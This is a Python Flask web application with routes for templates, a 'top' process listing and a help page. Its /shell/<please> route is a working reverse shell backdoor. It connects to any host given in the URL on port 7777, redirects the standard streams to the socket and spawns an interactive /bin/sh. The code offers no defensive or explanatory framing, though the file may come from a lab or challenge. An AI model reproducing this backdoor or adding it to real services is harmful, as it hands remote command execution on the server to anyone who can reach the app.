#!/usr/bin/python3

from flask import Flask, render_template
import subprocess
import socket
import os


app = Flask(__name__)


@app.route('/')
def start():
    return render_template('start.html')


@app.route('/image')
def image():
    return render_template('image.html')


@app.route('/top')
def top():
    return render_template('top.html', output=subprocess.check_output(['top', '-b', '-n', '1']).decode('utf-8').replace('\\n', '\n').replace('\\t', '\t'))


@app.route('/shell')
@app.route('/shell/<please>')
def shell(please=None):
    if please:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((please, 7777))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        return '<p>Shell died...hopefully you got what you needed</p>'
    else:
        return render_template('please.html')


@app.route('/help')
def help():
    return render_template('help.html')